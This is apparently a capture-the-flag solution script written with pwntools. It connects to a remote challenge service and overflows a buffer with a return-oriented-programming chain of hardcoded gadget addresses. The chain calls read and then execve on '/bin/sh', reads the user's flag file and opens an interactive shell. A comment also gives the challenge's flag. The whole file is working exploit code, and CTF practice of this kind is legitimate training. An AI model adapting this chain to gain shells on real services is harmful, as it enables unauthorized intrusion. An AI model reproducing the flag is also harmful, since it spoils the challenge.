#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# AIS3{rop_Rop_Rop_then_RIP}

e = ELF('simplerop_revenge')


context.arch = 'amd64'

host , port = 'pwnhub.tw' , 8361
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

pop_rdi = 0x401456
pop_rsi = 0x401577
pop_rdx = 0x4427e6
pppr = 0x478516 # pop rax ; pop rdx ; pop rbx ; ret
syscall_ret = 0x4671b5

main = 0x40093d
read = 0x40097e

i = 'D' * 0x20
i += 'RBBBBBBP'
i += flat( pppr , 0 , 0x100 , 0 , read )

p = 'D' * 0x48
p += flat(
    pop_rdi,
    0x0,
    pop_rsi,
    e.bss(),
    pppr,
    0x0,
    0x10,
    0x0,
    syscall_ret,
    pop_rsi,
    0x0,
    pop_rdi,
    e.bss(),
    pppr,
    0x3b,
    0x0,
    0x0,
    syscall_ret
)


y.sendline( i )
sleep(0.5)
y.sendline( p )
sleep(0.5)
y.sendline( '/bin/sh\x00' )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

